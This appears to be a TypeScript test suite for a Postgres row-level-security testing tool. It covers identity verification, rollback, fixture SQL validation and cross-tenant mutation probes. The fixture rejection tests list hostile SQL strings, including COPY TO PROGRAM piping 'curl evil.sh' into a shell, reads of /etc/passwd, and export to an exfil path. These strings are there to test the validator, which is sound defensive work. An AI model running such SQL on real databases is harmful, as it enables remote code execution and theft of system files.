import { describe, expect, it, vi } from 'vitest';
import type { CatalogSnapshot } from '@tenantshield/catalog';
import type { TenantShieldConfig } from '@tenantshield/config';
import {
  FixtureSetupError,
  IdentityVerificationError,
  establishIdentity,
  runDynamicTests,
  runFixtureSetup,
  runIsolatedCase,
  type DynamicSqlClient,
  type DynamicSqlResult,
} from './index.js';

const identity = {
  role: 'authenticated' as const,
  userId: '11111111-1111-1111-1111-111111111111',
  claims: { org_id: 'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa' },
};

describe('dynamic transaction context', () => {
  it('sets role and Supabase claims, then verifies effective identity', async () => {
    const query = vi.fn<DynamicSqlClient['query']>().mockImplementation((sql) => {
      if (sql.includes('FROM pg_roles'))
        return Promise.resolve({
          rows: [{ current_role: 'authenticated', is_superuser: false, can_bypass_rls: false }],
          rowCount: 1,
        });
      if (sql.includes('auth.uid()'))
        return Promise.resolve({
          rows: [
            {
              user_id: identity.userId,
              jwt: { sub: identity.userId, role: 'authenticated', org_id: identity.claims.org_id },
            },
          ],
          rowCount: 1,
        });
      return Promise.resolve({ rows: [], rowCount: 0 });
    });
    await establishIdentity({ query }, identity);
    expect(query.mock.calls.some(([sql]) => sql === 'SET LOCAL ROLE "authenticated"')).toBe(true);
    const claimsCall = query.mock.calls.find(([sql]) =>
      sql.includes("set_config('request.jwt.claims'"),
    );
    expect(String(claimsCall?.[1]?.[0])).not.toContain('undefined');
  });

  it('fails closed when auth.uid does not match', async () => {
    const client: DynamicSqlClient = {
      query: (sql) => {
        if (sql.includes('FROM pg_roles'))
          return Promise.resolve({
            rows: [{ current_role: 'authenticated', is_superuser: false, can_bypass_rls: false }],
            rowCount: 1,
          });
        if (sql.includes('auth.uid()'))
          return Promise.resolve({ rows: [{ user_id: null, jwt: {} }], rowCount: 1 });
        return Promise.resolve({ rows: [], rowCount: 0 });
      },
    };
    await expect(establishIdentity(client, identity)).rejects.toBeInstanceOf(
      IdentityVerificationError,
    );
  });

  it('rolls back an isolated case after success and failure', async () => {
    const statements: string[] = [];
    const client: DynamicSqlClient = {
      query: (sql) => {
        statements.push(sql);
        if (sql === 'boom') return Promise.reject(new Error('injected'));
        if (sql.includes('FROM pg_roles'))
          return Promise.resolve({
            rows: [{ current_role: 'authenticated', is_superuser: false, can_bypass_rls: false }],
            rowCount: 1,
          });
        if (sql.includes('auth.uid()'))
          return Promise.resolve({
            rows: [
              {
                user_id: identity.userId,
                jwt: {
                  sub: identity.userId,
                  role: 'authenticated',
                  org_id: identity.claims.org_id,
                },
              },
            ],
            rowCount: 1,
          });
        return Promise.resolve({ rows: [], rowCount: 0 });
      },
    };
    await expect(
      runIsolatedCase(client, identity, () => client.query('ok')),
    ).resolves.toBeDefined();
    await expect(runIsolatedCase(client, identity, () => client.query('boom'))).rejects.toThrow(
      'injected',
    );
    expect(statements.filter((sql) => sql === 'ROLLBACK')).toHaveLength(2);
    expect(statements).toContain('SAVEPOINT tenantshield_case');
  });

  it('evaluates deferred constraints before treating a case as allowed', async () => {
    const client: DynamicSqlClient = {
      query: (sql) => {
        if (sql.includes('FROM pg_roles'))
          return Promise.resolve({
            rows: [{ current_role: 'authenticated', is_superuser: false, can_bypass_rls: false }],
            rowCount: 1,
          });
        if (sql.includes('auth.uid()'))
          return Promise.resolve({
            rows: [
              {
                user_id: identity.userId,
                jwt: {
                  sub: identity.userId,
                  role: 'authenticated',
                  org_id: identity.claims.org_id,
                },
              },
            ],
            rowCount: 1,
          });
        if (sql === 'SET CONSTRAINTS ALL IMMEDIATE') {
          return Promise.reject(
            Object.assign(new Error('deferred constraint violation'), { code: '23503' }),
          );
        }
        return Promise.resolve({ rows: [], rowCount: sql === 'write' ? 1 : 0 });
      },
    };
    await expect(
      runIsolatedCase(client, identity, () => client.query('write')),
    ).rejects.toMatchObject({ code: '23503' });
  });

  it('rolls back failed fixture setup with a safe diagnostic', async () => {
    const query = vi.fn((sql: string) =>
      sql.includes('bad fixture')
        ? Promise.reject(new Error('raw secret row value'))
        : Promise.resolve({ rows: [], rowCount: 0 }),
    );
    await expect(runFixtureSetup({ query }, 'bad fixture')).rejects.toBeInstanceOf(
      FixtureSetupError,
    );
    expect(query.mock.calls.at(-1)?.[0]).toBe('ROLLBACK');
    await expect(runFixtureSetup({ query }, 'bad fixture')).rejects.not.toThrow(
      /raw secret row value/,
    );
  });

  it('does not claim rollback succeeded when fixture commit outcome is uncertain', async () => {
    const query = vi.fn((sql: string) => {
      if (sql === 'COMMIT' || sql === 'ROLLBACK')
        return Promise.reject(new Error('connection lost'));
      return Promise.resolve({ rows: [], rowCount: 0 });
    });

    await expect(runFixtureSetup({ query }, 'SELECT 1')).rejects.toThrow('rollback was attempted');
  });

  it.each([
    'COMMIT; SELECT 1',
    'begin; SELECT 1',
    'START TRANSACTION; SELECT 1',
    'ROLLBACK; SELECT 1',
    'ABORT; SELECT 1',
    'END; SELECT 1',
    'SAVEPOINT fixture_escape',
    'RELEASE SAVEPOINT fixture_escape',
    "PREPARE TRANSACTION 'fixture_escape'",
  ])('rejects fixture transaction control before executing it: %s', async (setupSql) => {
    const query = vi.fn<DynamicSqlClient['query']>().mockResolvedValue({ rows: [], rowCount: 0 });

    await expect(runFixtureSetup({ query }, setupSql)).rejects.toThrow(
      'Fixture SQL must not contain transaction-control statements',
    );
    expect(query).not.toHaveBeenCalled();
  });

  it('allows transaction words inside comments, strings, identifiers, and dollar quotes', async () => {
    const query = vi.fn<DynamicSqlClient['query']>().mockResolvedValue({ rows: [], rowCount: 0 });
    const setupSql = `
      -- COMMIT;
      /* outer ROLLBACK; /* nested SAVEPOINT hidden; */ still hidden */
      SELECT 'BEGIN; COMMIT', E'ROLLBACK\\' still text', "END", $$ABORT;$$, $tag$COMMIT;$tag$;
    `;

    await expect(runFixtureSetup({ query }, setupSql)).resolves.toBeUndefined();
    expect(query.mock.calls.map(([sql]) => sql)).toEqual([
      'BEGIN',
      "SET LOCAL statement_timeout = '30s'",
      "SET LOCAL lock_timeout = '5s'",
      setupSql,
      'COMMIT',
    ]);
  });

  it.each([
    "COPY secrets TO PROGRAM 'curl evil.sh | sh';",
    "COPY (SELECT 1) TO PROGRAM 'sh';",
    "SELECT dblink('dbname=prod port=5432', 'SELECT 1');",
    "SELECT dblink_exec('dbname=prod', 'INSERT INTO t VALUES (1)');",
    "SELECT extensions.dblink_exec('conn', 'SELECT 1');",
    "SELECT pg_notify('channel', 'payload');",
    "SELECT lo_import('/etc/passwd');",
    "SELECT lo_export(12345, '/tmp/exfil');",
    'SELECT lo_create(42);',
    "INSERT INTO audit (note) VALUES ('x'); SELECT pg_read_file('/etc/passwd');",
  ])('rejects side-effecting fixture statements: %s', async (setupSql) => {
    const query = vi.fn<DynamicSqlClient['query']>().mockResolvedValue({ rows: [], rowCount: 0 });

    await expect(runFixtureSetup({ query }, setupSql)).rejects.toThrow(
      'Fixture SQL must only perform deterministic data setup',
    );
    expect(query).not.toHaveBeenCalled();
  });

  it('allows side-effect keywords inside strings, comments, quoted identifiers, and dollar quotes', async () => {
    const query = vi.fn<DynamicSqlClient['query']>().mockResolvedValue({ rows: [], rowCount: 0 });
    const setupSql = `
      -- COPY t TO PROGRAM 'sh';
      /* dblink('conn', 'SELECT 1'); pg_notify('chan', 'msg'); lo_import('/x'); */
      INSERT INTO notes ("lo_import", body) VALUES (1, 'call dblink() later'), (2, $$lo_export($$);
      SELECT 'pg_notify(''chan'', ''msg'')', $tag$COPY t TO PROGRAM$tag$;
    `;

    await expect(runFixtureSetup({ query }, setupSql)).resolves.toBeUndefined();
    expect(query.mock.calls.map(([sql]) => sql)).toContain(setupSql);
  });
});

const probeAliceId = '11111111-1111-1111-1111-111111111111';
const probeBobId = '22222222-2222-2222-2222-222222222222';
const probeAliceTenant = 'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa';
const probeBobTenant = 'bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb';

const probeConfig: TenantShieldConfig = {
  version: 1,
  database: { connectionEnv: 'DATABASE_URL', allowedHosts: ['localhost'] },
  fixtures: { setupSql: 'fixtures.sql' },
  identities: {
    alice: {
      role: 'authenticated',
      userId: probeAliceId,
      claims: { org_id: probeAliceTenant },
    },
    bob: { role: 'authenticated', userId: probeBobId, claims: { org_id: probeBobTenant } },
  },
  resources: {
    invoices: {
      primaryKey: 'id',
      tenantColumn: 'org_id',
      ownerIdentity: 'alice',
      foreignIdentity: 'bob',
      testOperations: ['select', 'update', 'delete'],
    },
  },
};

const probeSnapshot: CatalogSnapshot = {
  version: 1,
  database: {
    name: 'postgres',
    serverVersion: '16',
    currentRole: 'postgres',
    isSuperuser: true,
    canBypassRls: true,
  },
  schemas: ['public'],
  tables: [
    {
      schema: 'public',
      name: 'invoices',
      rlsEnabled: true,
      rlsForced: false,
      columns: [
        { name: 'id', dataType: 'uuid', ordinal: 1 },
        { name: 'org_id', dataType: 'uuid', ordinal: 2 },
      ],
      primaryKey: ['id'],
      foreignKeys: [],
      grants: [],
      policies: [],
    },
  ],
  views: [],
  functions: [],
};

class MaskedReturningClient implements DynamicSqlClient {
  private identity = 'alice';
  private claims: Record<string, unknown> = {};
  readonly statements: string[] = [];

  query(sql: string, values: readonly unknown[] = []): Promise<DynamicSqlResult> {
    this.statements.push(sql);
    if (sql.startsWith('SET LOCAL ROLE')) return Promise.resolve({ rows: [], rowCount: 0 });
    if (sql.includes("set_config('request.jwt.claims'")) {
      this.claims = JSON.parse(String(values[0])) as Record<string, unknown>;
      this.identity = this.claims['sub'] === probeAliceId ? 'alice' : 'bob';
      return Promise.resolve({ rows: [], rowCount: 0 });
    }
    if (sql.includes('FROM pg_roles')) {
      return Promise.resolve({
        rows: [{ current_role: 'authenticated', is_superuser: false, can_bypass_rls: false }],
        rowCount: 1,
      });
    }
    if (sql.includes('auth.uid()')) {
      return Promise.resolve({
        rows: [{ user_id: this.claims['sub'], jwt: this.claims }],
        rowCount: 1,
      });
    }
    if (sql.includes('tenantshield_fixture')) {
      const own =
        this.identity === 'alice'
          ? { primary_key: 'invoice-a', tenant_key: probeAliceTenant }
          : { primary_key: 'invoice-b', tenant_key: probeBobTenant };
      return Promise.resolve({ rows: [own], rowCount: 1 });
    }
    if (sql.includes('tenantshield_select')) {
      const ownerTarget = values[0] === 'invoice-a';
      const visible = this.identity === 'alice' ? ownerTarget : !ownerTarget;
      return Promise.resolve({ rows: [], rowCount: visible ? 1 : 0 });
    }
    if (sql.includes('tenantshield_update') || sql.includes('tenantshield_delete')) {
      if (/\breturning\b/i.test(sql)) {
        return Promise.resolve({ rows: [], rowCount: 0 });
      }
      return Promise.resolve({ rows: [], rowCount: 1 });
    }
    return Promise.resolve({ rows: [], rowCount: 0 });
  }
}

describe('cross-tenant mutation probes', () => {
  it('judges a masked cross-tenant mutation as allowed instead of blocked', async () => {
    const client = new MaskedReturningClient();
    const result = await runDynamicTests(client, probeConfig, probeSnapshot);

    expect(result.cases).toContainEqual(
      expect.objectContaining({
        operation: 'update',
        control: 'foreign',
        identity: 'bob',
        status: 'failed',
        observed: 'allowed',
      }),
    );
    expect(result.cases).toContainEqual(
      expect.objectContaining({
        operation: 'delete',
        control: 'foreign',
        identity: 'bob',
        status: 'failed',
        observed: 'allowed',
      }),
    );
    expect(result.findings.map((finding) => finding.ruleId)).toContain('TS-DYN-UPDATE');
    expect(result.findings.map((finding) => finding.ruleId)).toContain('TS-DYN-DELETE');
  });

  it('omits RETURNING from every mutating probe so rowCount reflects affected rows', async () => {
    const client = new MaskedReturningClient();
    await runDynamicTests(client, probeConfig, probeSnapshot);

    const mutatingSql = client.statements.filter((sql) =>
      /tenantshield_(select|update|delete)/.test(sql),
    );
    expect(mutatingSql.length).toBeGreaterThan(0);
    expect(mutatingSql.every((sql) => !/\breturning\b/i.test(sql))).toBe(true);
  });

  it('re-verifies the targeted row tenant and bounds the SELECT probe', async () => {
    const client = new MaskedReturningClient();
    await runDynamicTests(client, probeConfig, probeSnapshot);

    const selectSql = client.statements.find((sql) => sql.includes('tenantshield_select'));
    expect(selectSql).toMatch(/^\/\* tenantshield_select \*\/ SELECT 1 FROM /);
    expect(selectSql).toMatch(/LIMIT 1$/);
    expect(selectSql).toMatch(/WHERE "id"::text = \$1 AND "org_id"::text = \$2/);

    const updateSql = client.statements.find(
      (sql) => sql.includes('tenantshield_update') && !sql.includes('tenantshield_update_tenant'),
    );
    expect(updateSql).toMatch(/WHERE "id"::text = \$1 AND "org_id"::text = \$2/);

    const deleteSql = client.statements.find((sql) => sql.includes('tenantshield_delete'));
    expect(deleteSql).toMatch(/WHERE "id"::text = \$1 AND "org_id"::text = \$2/);

    const reassignmentSql = client.statements.find((sql) =>
      sql.includes('tenantshield_update_tenant'),
    );
    expect(reassignmentSql).toMatch(/WHERE "id"::text = \$1 AND "org_id"::text = \$3/);
  });
});
